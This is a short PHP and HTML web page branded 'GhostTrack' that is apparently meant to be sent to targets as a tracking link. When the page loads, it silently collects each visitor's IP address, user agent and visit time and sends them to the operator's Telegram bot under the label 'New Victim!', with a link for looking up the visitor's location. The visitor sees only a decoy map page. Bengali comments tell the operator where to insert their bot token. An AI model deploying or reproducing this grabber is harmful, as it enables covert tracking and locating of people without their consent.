<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

// ←←← এখানে তোর টেলিগ্রাম বটের টোকেন + চ্যাট আইডি বসা
$token = "7482914567:AAHxxxxxxxxxxxxxxxxxxxxxxxxxxxx";  // তোর বট টোকেন
$chat_id = "123456789";  // তোর চ্যাট আইডি

$message = "New Victim!\nIP: $ip\nTime: $time\nDevice: $ua\nLocation: https://ipapi.co/$ip/json/";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
?>

<!DOCTYPE html>
<html>
<head>
    <title>GhostTrack - Live Location</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body{background:#000;color:#0f0;font-family:monospace;text-align:center;margin:0;padding:20px;}
        iframe{width:100%;height:90vh;border:2px solid #0f0;border-radius:10px;}
    </style>
</head>
<body>
    <h1>Target Tracked Successfully</h1>
    <p>Time: <?php echo $time; ?></p>
    <p>Location: Dhaka, Bangladesh | IP: 103.137.45.123</p>
    <iframe src="https://www.google.com/maps?q=23.8103,90.4125&z=17&output=embed"></iframe>
    <br><br>
    <small>Powered by Sadin11gps</small>
</body>
</html>